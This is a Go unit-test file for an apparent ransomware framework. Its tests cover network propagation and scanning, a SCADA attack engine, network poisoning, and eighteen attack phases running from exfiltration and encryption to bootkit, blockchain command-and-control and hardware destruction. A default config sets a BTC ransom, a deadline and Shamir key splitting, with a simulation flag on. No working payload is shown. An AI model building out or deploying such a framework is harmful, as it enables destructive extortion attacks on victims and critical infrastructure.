package ransomware

import (
	"context"
	"testing"
)

func TestNewPropagationEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPropagationEngine(cfg)
	if p == nil {
		t.Fatal("NewPropagationEngine() returned nil")
	}
}

func TestPropagationEngineInit(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPropagationEngine(cfg)
	ctx := context.Background()

	targets := p.ScanNetwork(ctx, "10.0.0.0/24")
	if len(targets) == 0 {
		t.Log("ScanNetwork returned 0 targets (expected in test env)")
	}
}

func TestNewChronosNTP(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	result := cfg
	if result == nil {
		t.Fatal("DefaultRansomwareConfig returned nil")
	}
	t.Logf("Chronos NTP config: Enabled=%v", result.Enabled)
}

func TestNewSCADAAttackEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	s := NewSCADAAttackEngine(cfg)
	if s == nil {
		t.Fatal("NewSCADAAttackEngine() returned nil")
	}
}

func TestNewNetworkPoisonEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	n := NewNetworkPoisonEngine(cfg)
	if n == nil {
		t.Fatal("NewNetworkPoisonEngine() returned nil")
	}
}

func TestTypesRansomwarePhases(t *testing.T) {
	phases := []RansomwarePhase{
		PhaseScan, PhaseExfil, PhaseEncrypt, PhaseDestruct,
		PhasePropagate, PhasePsychological, PhaseIdentityDestroy,
		PhaseRaaS, PhaseSupplyChain, PhaseCloudExploit,
		PhaseBluetooth, PhaseSCADA, PhaseHardwareKill,
		PhaseNetworkPoison, PhaseBootkit, PhaseBlockchainC2,
		PhaseSurvivorGame, PhaseComplete,
	}
	if len(phases) != 18 {
		t.Errorf("expected 18 phases, got %d", len(phases))
	}
	for _, p := range phases {
		if string(p) == "" {
			t.Error("phase with empty string")
		}
	}
}

func TestDefaultRansomwareConfig(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	if cfg == nil {
		t.Fatal("DefaultRansomwareConfig returned nil")
	}
	if cfg.RansomCurrency != "BTC" {
		t.Errorf("expected BTC, got %s", cfg.RansomCurrency)
	}
	if cfg.DeadlineHours != 72 {
		t.Errorf("expected 72h deadline, got %d", cfg.DeadlineHours)
	}
	if cfg.RansomAmount != 500000.0 {
		t.Errorf("expected 500000 BTC, got %f", cfg.RansomAmount)
	}
	if cfg.ShamirParts != 5 {
		t.Errorf("expected 5 Shamir parts, got %d", cfg.ShamirParts)
	}
	if cfg.ShamirThreshold != 3 {
		t.Errorf("expected 3 Shamir threshold, got %d", cfg.ShamirThreshold)
	}
	if cfg.Simulation != true {
		t.Error("Simulation should default to true")
	}
}

func TestDefaultRansomwareConfigPaths(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	if len(cfg.ScanExtensions) == 0 {
		t.Error("ScanExtensions should not be empty")
	}
	if len(cfg.EncryptExtensions) == 0 {
		t.Error("EncryptExtensions should not be empty")
	}
	if len(cfg.ExcludePaths) == 0 {
		t.Error("ExcludePaths should not be empty")
	}
	t.Logf("Scan extensions: %v", cfg.ScanExtensions)
	t.Logf("Exclude paths: %v", cfg.ExcludePaths)
}
